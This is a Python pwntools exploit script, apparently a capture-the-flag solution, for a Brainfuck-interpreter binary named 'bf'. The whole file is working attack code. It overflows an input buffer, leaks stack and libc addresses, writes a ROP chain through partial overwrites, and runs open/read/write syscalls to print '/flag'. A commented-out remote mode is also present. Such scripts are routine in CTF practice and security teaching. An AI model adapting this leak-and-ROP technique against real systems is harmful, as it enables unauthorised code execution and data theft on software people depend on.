from pwn import *
import sys

context.arch = 'amd64'

def write_low_bit(low_bit,offset):
    p.recvuntil("enter your code:\n")
    p.sendline(",[>,]>,")
    p.recvuntil("running....\n")
    p.send("B"*0x3ff+'\x00')
    p.send(chr(low_bit+offset))
    p.recvuntil("your code: ")
    p.recvuntil("continue?\n")
    p.send('y')
    p.recvuntil("enter your code:\n")
    p.sendline("\x00"*0xf)
    p.recvuntil("continue?\n")
    p.send('y')

#def main(host,port=6002):
def main():
    global p
    p = process("./bf")
    # leak low_bit
    p.recvuntil("enter your code:\n")
    p.sendline(",[.>,]>.")
    p.send("B"*0x3ff+'\x00')
    p.recvuntil("running....\n")
    p.recvuntil("B"*0x3ff)
    low_bit = ord(p.recv(1))
    info(hex(low_bit))
    if low_bit + 0x70 >= 0x100: # :(
        sys.exit(0)
    # debug(0x000000000001C47)
    p.recvuntil("continue?\n")
    p.send('y')


    # leak stack
    p.recvuntil("enter your code:\n")
    p.sendline(",[>,]>,")
    p.recvuntil("running....\n")
    p.send("B"*0x3ff+'\x00')
    p.send(chr(low_bit+0x20))
    p.recvuntil("your code: ")
    stack = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00")) - 0xd8
    info("stack : " + hex(stack))
    p.recvuntil("continue?\n")
    p.send('y')
    # leak libc

    p.recvuntil("enter your code:\n")
    p.sendline(",[>,]>,")
    p.recvuntil("running....\n")
    p.send("B"*0x3ff+'\x00')
    p.send(chr(low_bit+0x38))
    p.recvuntil("your code: ")
    libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00")) - 0x21b97
    info("libc : " + hex(libc.address))
    p.recvuntil("continue?\n")
    p.send('y')

    # do rop

    # 0x00000000000a17e0: pop rdi; ret;
    # 0x00000000001306d9: pop rdx; pop rsi; ret;
    p_rdi = 0x00000000000a17e0 + libc.address
    p_rdx_rsi = 0x00000000001306d9 + libc.address
    ret = 0x00000000000d3d8a + libc.address
    p_rax = 0x00000000000439c8 + libc.address
    syscall_ret = 0x00000000000d2975 + libc.address

    rop_chain = [
        0,0,p_rdi,0,p_rdx_rsi,0x100,stack,libc.symbols["read"]
    ]

    rop_chain_len = len(rop_chain)

    for i in range(rop_chain_len-1,0,-1):
        write_low_bit(low_bit,0x57-8*(rop_chain_len-1-i))
        p.recvuntil("enter your code:\n")
        p.sendline('\x00'+p64(rop_chain[i-1])+p64(rop_chain[i])[:6])
        p.recvuntil("continue?\n")
        p.send('y')

    write_low_bit(low_bit,0)

    p.recvuntil("enter your code:\n")
    p.sendline('')
    p.recvuntil("continue?\n")
    p.send('n')


    payload = "/flag".ljust(0x30,'\x00')
    payload += flat([
        p_rax,2,p_rdi,stack,p_rdx_rsi,0,0,syscall_ret,
        p_rdi,3,p_rdx_rsi,0x80,stack+0x200,p_rax,0,syscall_ret,
        p_rax,1,p_rdi,1,syscall_ret
    ])

    p.send(payload.ljust(0x100,'\x00'))


    p.interactive()

if __name__ == "__main__":
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
    elf = ELF("./bf",checksec=False)
    #main(args['REMOTE'])
    main()

